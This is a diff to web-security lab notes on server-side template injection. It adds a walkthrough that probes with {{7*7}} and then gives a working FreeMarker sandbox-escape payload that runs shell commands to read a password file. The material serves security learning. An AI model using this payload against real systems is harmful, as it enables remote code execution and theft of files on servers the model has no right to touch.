@@ -168,7 +168,15 @@ Jinja2 - Python/Flask Template engine
 
 #6 Lab: Server-side template injection in a sandboxed environment
 
-    1.
+    1.In edit template section enter {{7*7}} and it will reflect error through which we can identify the template engine.
+    2.Payload to use:-
+                   <#assign classloader=product.class.protectionDomain.classLoader>
+                   <#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
+                   <#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
+                   <#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
+                   ${dwf.newInstance(ec,null)("ls")}
+    then cat my_password.txt and submit the answer.
 
+----------------------------------------------------------------------------------------------------------------------------------
 
 PREVENTION OF SSTI:- The best way to prevent server-side template injection is to not allow any users to modify or submit new templates
